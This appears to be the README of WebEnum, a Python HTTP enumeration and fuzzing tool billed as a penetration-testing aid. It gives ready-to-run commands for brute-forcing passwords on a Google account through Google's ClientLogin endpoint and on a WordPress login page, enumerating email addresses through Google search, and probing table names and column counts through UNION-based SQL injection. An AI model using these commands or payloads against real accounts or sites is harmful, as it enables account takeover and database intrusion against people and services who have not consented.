**WebEnum is a tool to enumerate http responses using dynamically generated queries.**

It is a flexible universal tool useful to perform penetration testing to web servers. It is useful to

  * Bruteforce web accounts and passwords
  * Discovery directories, files and users with ~user Apache method
  * Guess table names and columns size in SQL injection
  * Fuzz HTTP requests including GET, POST and HTTP Header
  * Audit webserver behaviours generating multiple HTTP requests

Is available an italian tutorial in [dissecting](http://thissecting.wordpress.com/) security blog.

**Usage**:

`./webenum [-w wordlist] [-h header] [-d POST data] [-m match] URL`


WebEnum generate URL, POST data or headers using special _dynamic string_ (`%%WORD%%, %%WORD[0-9]%%, %%INT%%, %%CHAR%%, %%TABLE%%`). Searched pages are distinguished by other with a little python statement specified in _-m_ option. More explanation after examples.

### Examples ###

**Enumerate files and directories on www.target.com (no wordlist specified, using internal one)**

```
./webenum.py -m "status_code != 404" http://www.target.com/%%WORD%%
```

**Bruteforce Google account user@gmail.com with passwords in _passwords.txt_**

```
./webenum.py -w passwords.txt \
-d "Email=user@gmail.com" \
-d "Passwd=%%WORD1%%" \
-d "accountType=GOOGLE" \
-d "service=lh2" \
-m "'SID' in response" \
"https://www.google.com/accounts/ClientLogin" 
```

**Bruteforce Wordpress account trying users in _users.txt_ with password list in _passwords.txt_**

```
./webenum.py -w users.txt -w passwords.txt \
-d "log=%%WORD1%%" \
-d "pwd=%%WORD2%%" \
-d "wp-submit=Log%20In" \
-m "'login_error' not in response" \
http://myblog.wordpress.com/wp-login.php
```

**Enumerate emails in _emails.txt_ using google search**

```
./webenum.py -w emails.txt -m "'No results found' not in response" http://www.google.com/search?q=\"%%WORD1%%\"
```


**Find table names in SQL injection, using internal wordlist**

```
./webenum.py -m "'Table not found' not in response" \
http://www.target.com/page.php?id=4 UNION SELECT 1,1,1 from %%WORD%%
```


**Find table column number in SQL injection**

```
./webenum.py -m "'Columns not match' not in response" \
http://www.target.com/page.php?id=4 UNION SELECT %%TABLE%% from tablename
```





### _Dynamic strings_ allowed in URL, headers and POST data ###

  * `%%WORD%%`, generate strings fetched from internal wordlist of ~900 common words.
  * `%%WORD[0-9]%%` generate strings fetched from wordlist files specified in -w options.
  * `%%INT%%`, generate integer ranges. Default: from 0 to 50.
  * `%%CHAR%%`, generate character and string ranges. Default: from 'a' to 'z'.
  * `%%TABLE%%`, generate 1,1,...,1 string, useful in sql injection to enumerate columns. Default: from 0 to 50.

INT, CHAR and TABLE default option can be customized using `[end]` or `[start]:[end]`, for example as `%%INT100:110%%`, `%%INT1%%`, `%%CHARaaa:zzz%%`, `%%TABLE100%%`.

### Match ###
Correct response are distinguished with a little python statement. The checkable parameters are _response_ and _status\_code_. Match strings can be

_"'Logged' in response or status\_code == 200"_
_"'Wrong password' in response"_

### POST datas, headers and wordlists ###
_Dynamic strings_ are allowed in POST data (-d) and headers (-h) as in URL. With %%WORD`[0-9]`%%, wordlist files paths are needed. Multiple values are supported:

_`-d "param1=value" -d "param2=value" -d "param3=%%WORD%%"`_
_`-h "User-Agent:Mozilla Firefox %%INT4:12%%.0" -h "Referer:%%WORD1%%"`_
_-w users.txt -w password.txt_

